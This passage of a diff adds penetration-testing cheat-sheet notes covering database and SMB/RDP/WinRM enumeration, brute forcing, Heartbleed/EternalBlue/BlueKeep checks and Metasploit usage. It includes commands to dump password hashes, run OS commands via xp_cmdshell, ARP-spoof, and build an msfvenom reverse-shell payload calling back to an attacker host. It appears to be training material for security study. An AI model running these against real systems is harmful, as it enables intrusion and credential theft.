+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">variables</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">"mysqluser='root',mysqlpass=''"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">emumerate</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">dump</span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">"username='root',password=''"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">dump</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">query</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">"query='&lt;query&gt;',username='root',password=''"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">audit</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">"mysql-audit.username='root',mysql-audit.pass='',mysql-audit.filename='nselib/data/mysql-cis.audit'"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Audits</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">audit</span><span class="w"> </span><span class="n">rulebase</span><span class="w"> </span><span class="p">(</span><span class="n">mysql</span><span class="o">.</span><span class="n">audit</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="hydra_3">hydra</h4>
+<div class="highlight"><pre><span></span><code>- hydra -l &lt;username&gt; (or -L &lt;username wordlist&gt;) -P &lt;passwd wordlist&gt; &lt;target&gt; mysql // perform bruteforcing
+</code></pre></div>
+<h3 id="mssql_1">MSSQL</h3>
+<h4 id="nmap_7">nmap</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">info</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">version</span><span class="p">,</span><span class="w"> </span><span class="n">patches</span><span class="p">,</span><span class="w"> </span><span class="n">etc</span><span class="o">.</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">mssql</span><span class="o">.</span><span class="n">instance</span><span class="o">-</span><span class="n">port</span><span class="o">=</span><span class="mi">1433</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">enumerates</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="k">remote</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">services</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">NTLM</span><span class="w"> </span><span class="n">authentication</span><span class="w"> </span><span class="n">enabled</span><span class="o">.</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">brute</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">userdb</span><span class="o">=&lt;</span><span class="n">users</span><span class="w"> </span><span class="n">list</span><span class="o">&gt;</span><span class="p">,</span><span class="n">passdb</span><span class="o">=&lt;</span><span class="n">pwd</span><span class="w"> </span><span class="n">db</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">bruteforce</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">mssql</span><span class="w"> </span><span class="n">server</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">empty</span><span class="o">-</span><span class="n">password</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">allows</span><span class="w"> </span><span class="n">empty</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">logins</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">query</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">mssql</span><span class="o">.</span><span class="n">username</span><span class="o">=&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="p">,</span><span class="n">mssql</span><span class="o">.</span><span class="n">password</span><span class="o">=&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="p">,</span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">query</span><span class="p">,</span><span class="n">query</span><span class="o">=</span><span class="s2">"&lt;query&gt;"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">dump</span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">mssql</span><span class="o">.</span><span class="n">username</span><span class="o">=&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="p">,</span><span class="n">mssql</span><span class="o">.</span><span class="n">password</span><span class="o">=&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">dump</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">xp</span><span class="o">-</span><span class="n">cmdshell</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">mssql</span><span class="o">.</span><span class="n">username</span><span class="o">=&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="p">,</span><span class="n">mssql</span><span class="o">.</span><span class="n">password</span><span class="o">=&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="p">,</span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">xp</span><span class="o">-</span><span class="n">cmdshell</span><span class="o">.</span><span class="n">cmd</span><span class="o">=</span><span class="s2">"&lt;command&gt;"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">os</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+</code></pre></div>
+<h4 id="metasploit_5">metasploit</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_login</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">bruteforce</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">various</span><span class="w"> </span><span class="n">informations</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum_sql_logins</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_exec</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">commands</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_enum_domain_accounts</span>
+</code></pre></div>
+<h3 id="smtp_1">SMTP</h3>
+<h4 id="metasploit_6">metasploit</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smtp</span><span class="o">/</span><span class="n">smtp_version</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smtp</span><span class="o">/</span><span class="n">smtp_enum</span><span class="p">:</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">users</span>
+</code></pre></div>
+<h1 id="vulnerability-assessment_3">Vulnerability Assessment</h1>
+<h2 id="heartbleed">Heartbleed</h2>
+<h3 id="nmap_8">nmap</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">ciphers</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">heartbleed</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">443</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+</code></pre></div>
+<h3 id="exploitdb">ExploitDB</h3>
+<ul>
+<li>https://www.exploit-db.com/search?q=heartbleed</li>
+</ul>
+<h2 id="eternalblue-ms17-1010_1">EternalBlue - MS17-1010</h2>
+<h3 id="nmap_9">nmap</h3>
+<div class="highlight"><pre><span></span><code>- nmap -p 445 --script smb-vuln-ms17-010 &lt;target&gt;
+</code></pre></div>
+<h3 id="exploitdb_1">ExploitDB</h3>
+<ul>
+<li>https://www.exploit-db.com/search?q=ms17-010</li>
+</ul>
+<h2 id="log4j_1">Log4J</h2>
+<h3 id="nmap_10">nmap</h3>
+<ul>
+<li>https://github.com/giterlizzi/nmap-log4shell</li>
+</ul>
+<h2 id="webdav_1">WebDAV</h2>
+<h3 id="davtest">davtest</h3>
+<div class="highlight"><pre><span></span><code>- davtest -url &lt;webdav url&gt;
+- davtest -auth &lt;username:password&gt; -url &lt;webdav url and directory&gt; 
+</code></pre></div>
+<h3 id="cadaver">cadaver</h3>
+<div class="highlight"><pre><span></span><code>- cadaver &lt;webdav url&gt;
+</code></pre></div>
+<h3 id="nmap_11">Nmap</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">http</span><span class="o">-</span><span class="k">enum</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+</code></pre></div>
+<h3 id="hydra_4">Hydra</h3>
+<div class="highlight"><pre><span></span><code>- hydra -L &lt;users wordlist&gt; -P &lt;passwords wordlist&gt; &lt;target&gt; http-get &lt;webdav directory&gt; 
+</code></pre></div>
+<h3 id="metasploit_7">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=&lt;</span><span class="n">attacker</span><span class="w"> </span><span class="n">host</span><span class="o">&gt;</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=&lt;</span><span class="n">attacker</span><span class="w"> </span><span class="n">port</span><span class="o">&gt;</span><span class="w">  </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">&lt;</span><span class="n">format</span><span class="p">:</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">example</span><span class="w"> </span><span class="n">asp</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="o">.&lt;</span><span class="n">format</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span>
+
+<span class="o">-</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">iis</span><span class="o">/</span><span class="n">iis_webdav_upload_asp</span>
+</code></pre></div>
+<h2 id="smb_2">SMB</h2>
+<h3 id="impacket-scripts">Impacket Scripts</h3>
+<div class="highlight"><pre><span></span><code><span class="p">-</span> <span class="nf">psexec</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">Administrator</span><span class="mf">@192.168.1.1</span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">Administrator</span><span class="mf">@192.168.1.1</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbexec</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">Administrator</span><span class="mf">@192.168.1.1</span>
+</code></pre></div>
+<h3 id="metasploit_8">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/smb/smb_login
+<span class="k">-</span> exploit/windows/smb/psexec
+</code></pre></div>
+<h2 id="ms17-010-eternalblue-exploit_1">MS17-010 EternalBlue Exploit</h2>
+<h3 id="nmap_12">Nmap</h3>
+<div class="highlight"><pre><span></span><code>- nmap -sV -O -p 445 &lt;target&gt;
+- nmap -sV -p 445 --script=smb-vuln-m17-010 &lt;target&gt;
+</code></pre></div>
+<h3 id="metasploit_9">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/smb/smb_ms17_010
+<span class="k">-</span> exploit/windows/smb/ms17_010_eternalblue
+</code></pre></div>
+<h3 id="autoblue">AutoBlue</h3>
+<p><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a>: see documentation</p>
+<h2 id="rdp_1">RDP</h2>
+<h3 id="nmap_13">Nmap</h3>
+<div class="highlight"><pre><span></span><code>- nmap -sV -O -p- &lt;target&gt;
+</code></pre></div>
+<h3 id="metasploit_10">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/rdp/rdp_scanner
+</code></pre></div>
+<h3 id="hydra_5">Hydra</h3>
+<div class="highlight"><pre><span></span><code>- hydra -L &lt;users wordlist&gt; -P &lt;password wordlist&gt; -s &lt;port&gt; &lt;target&gt; rdp
+- hydra -L &lt;users wordlist&gt; -P &lt;password wordlist&gt; -s &lt;port&gt; rdp://&lt;target&gt; 
+
+To reduce/increase the bruteforce speed:
+
+- -t option 
+</code></pre></div>
+<h3 id="xfreerdp">xfreerdp</h3>
+<div class="highlight"><pre><span></span><code>- xfreerdp /u:&lt;user&gt; /p:&lt;password&gt; /v:&lt;target&gt;:&lt;port&gt;
+</code></pre></div>
+<h2 id="cve-2019-0708-bluekeep_1">CVE-2019-0708 - BlueKeep</h2>
+<h3 id="nmap_14">Nmap</h3>
+<div class="highlight"><pre><span></span><code>- nmap -sV -p 3389 &lt;target&gt;
+</code></pre></div>
+<h3 id="metasploit_11">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> scanner/rdp/cve_2019_0708_bluekeep
+<span class="k">-</span> exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+</code></pre></div>
+<h2 id="winrm_1">WinRM</h2>
+<h3 id="crackmapexec">crackmapexec</h3>
+<div class="highlight"><pre><span></span><code>- crackmapexec winrm &lt;target&gt; -u &lt;users worldist|username&gt; -p &lt;passwords wordlist&gt; 
+- crackmapexec winrm &lt;target&gt; -u &lt;users worldist|username&gt; -p &lt;passwords wordlist&gt;  -x "&lt;command&gt;"
+</code></pre></div>
+<h3 id="evil-winrm">evil-winrm</h3>
+<div class="highlight"><pre><span></span><code>- evil-winrm.rb -u &lt;user&gt; -p &lt;password&gt; -i &lt;target&gt;
+</code></pre></div>
+<h3 id="nmap_15">Nmap</h3>
+<div class="highlight"><pre><span></span><code>- nmap -sV -p 5985,5986 &lt;target&gt;
+</code></pre></div>
+<p>*Note: generally WinRM hasn't a default banner so in nmap result could not be immediate to identify this service</p>
+<h3 id="metasploit_12">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> exploit/windows/winrm/winrm_script_exec - "set FORCE_VBS true" can be useful
+</code></pre></div>
+<h1 id="network-based-attacks_2">Network-Based Attacks</h1>
+<h2 id="wireshark_1">Wireshark</h2>
+<p>Force name resolution - display dns name instead of IP address or MAC address: </p>
+<div class="highlight"><pre><span></span><code>- View &gt; Name resolution &gt; Resolve Network Addresses
+</code></pre></div>
+<p>Break down the protocols found in the packet capture:</p>
+<div class="highlight"><pre><span></span><code>- Statistics &gt; Protocol hierarchy
+</code></pre></div>
+<p>Break down by addresses each machine found in the packet capture:</p>
+<div class="highlight"><pre><span></span><code>- Statistics &gt; Protocol hierarchy
+</code></pre></div>
+<p>Customize displayed columns:</p>
+<div class="highlight"><pre><span></span><code>- right click on columns header &gt; Columns Preferences
+</code></pre></div>
+<p>Get the whole conversation:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nx">right</span><span class="w"> </span><span class="nx">click</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="kn">package</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="nx">Follow</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="nx">TCP</span><span class="o">/</span><span class="nx">HTTP</span><span class="w"> </span><span class="nx">Stream</span>
+</code></pre></div>
+<p>Export Objects like images or whole html pages:</p>
+<div class="highlight"><pre><span></span><code>- File &gt; Export Objects
+</code></pre></div>
+<h2 id="tshark">Tshark</h2>
+<p>Open saved pcap:</p>
+<div class="highlight"><pre><span></span><code>- tshark -r &lt;file&gt;
+</code></pre></div>
+<p>Break down protocols found in pcap (Protocol Hierarchy):</p>
+<div class="highlight"><pre><span></span><code>- tshark -r &lt;file&gt; -z io,phs -q
+</code></pre></div>
+<p>Apply Wireshark Display Filters:</p>
+<div class="highlight"><pre><span></span><code>- tshark -r &lt;file&gt; -Y '&lt;filter&gt;'
+</code></pre></div>
+<p>Display only specified fields:</p>
+<div class="highlight"><pre><span></span><code>- tshark -r &lt;file&gt; -Y '&lt;filter&gt;' -Tfield -e &lt;field name&gt; ...
+</code></pre></div>
+<h2 id="arp-poisoning">ARP Poisoning</h2>
+<p>Enable ip forwarding:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre></div>
+<p>Start arp spoofing:</p>
+<div class="highlight"><pre><span></span><code>- arpspoof -i &lt;interface&gt; -t &lt;target ip&gt;-r &lt;spoofed host&gt;
+</code></pre></div>
+<h1 id="metasploit-framework_1">Metasploit Framework</h1>
+<h2 id="msf-console">MSF Console</h2>
+<p>Check the state of databases:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> db_status
+</code></pre></div>
+<p>Show all available modules:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="nv">all</span>
+</code></pre></div>
+<p>Show specific type of module:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">module</span><span class="p">:</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">example</span><span class="p">,</span><span class="w"> </span><span class="nx">exploits</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">see</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="o">-</span><span class="nx">h</span><span class="p">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="k">type</span><span class="p">:&lt;</span><span class="nx">module</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Search module by name:</p>
+<div class="highlight"><pre><span></span><code>- search &lt;term&gt;
+</code></pre></div>
+<p>Search module by attributes (combinable):</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">cve</span><span class="p">:&lt;</span><span class="nx">cve</span><span class="p">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">platform</span><span class="p">:&lt;</span><span class="nx">windows</span><span class="o">|</span><span class="nx">linux</span><span class="p">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="k">type</span><span class="p">:&lt;</span><span class="nx">module</span><span class="p">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">name</span><span class="p">:&lt;</span><span class="nx">name</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Use a module:</p>
+<div class="highlight"><pre><span></span><code>- use &lt;module name or index after search&gt;
+</code></pre></div>
+<p>Show module options:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="nv">options</span><span class="w"> </span><span class="nv">OR</span><span class="w"> </span><span class="nv">options</span>
+</code></pre></div>
+<p>Set option value:</p>
+<div class="highlight"><pre><span></span><code>- set &lt;option name&gt; &lt;value&gt;
+- setg &lt;option name&gt; &lt;value&gt; - set globally
+</code></pre></div>
+<p>Get information about the module:</p>
+<div class="highlight"><pre><span></span><code>- info
+</code></pre></div>
+<p>Run the module:</p>
+<div class="highlight"><pre><span></span><code>- run OR exploit
+</code></pre></div>
+<p>List active sessions:</p>
+<div class="highlight"><pre><span></span><code>- sessions
+</code></pre></div>
+<p>Rename a session:</p>
+<div class="highlight"><pre><span></span><code>- sessions -n &lt;name&gt; &lt;session id&gt;
+</code></pre></div>
+<p>Kill a session:</p>
+<div class="highlight"><pre><span></span><code>- sessions -k &lt;session id&gt;
+</code></pre></div>
+<p>Load an installed plugin:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="o">&lt;</span><span class="n">plugin</span><span class="w"> </span><span class="n">name</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Load a custom script:</p>
+<div class="highlight"><pre><span></span><code>- resource &lt;script path&gt;
+</code></pre></div>
+<p>Connect to an host, similarly to netcat, for example to perform banner grabbing:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="k">connect</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">options</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">host</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">port</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">see</span><span class="w"> </span><span class="k">connect</span><span class="w"> </span><span class="o">-</span><span class="nv">h</span>
+</code></pre></div>
+<p>List enumerated hosts:</p>
+<div class="highlight"><pre><span></span><code>- hosts
+</code></pre></div>
+<p>List enumerated services:</p>
+<div class="highlight"><pre><span></span><code>- services
+</code></pre></div>
+<p>List enumerated vulnerabilities:</p>
+<div class="highlight"><pre><span></span><code>- vulns
+</code></pre></div>
+<h2 id="msf-workspaces">MSF Workspaces</h2>
+<p>List workspaces:</p>
+<div class="highlight"><pre><span></span><code>- workspace
+</code></pre></div>
+<p>Add workspace:</p>
+<div class="highlight"><pre><span></span><code>- workspace -a &lt;name&gt;
+</code></pre></div>
+<p>Switch workspace:</p>
+<div class="highlight"><pre><span></span><code>- workspace &lt;name&gt;
+</code></pre></div>
+<p>Remove workspace:</p>
+<div class="highlight"><pre><span></span><code>- workspace -d &lt;name&gt;
+</code></pre></div>
+<p>Rename workspace:</p>
+<div class="highlight"><pre><span></span><code>- workspace -r &lt;current name&gt; &lt;new name&gt;
+</code></pre></div>
+<h2 id="msf-information-gathering-enumeration">MSF: Information Gathering &amp; Enumeration</h2>
+<p>Manually import nmap xml scan result into MSF:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span> <span class="n">db_import</span> <span class="o">&lt;</span><span class="n">xml</span> <span class="n">path</span><span class="o">&gt;</span>
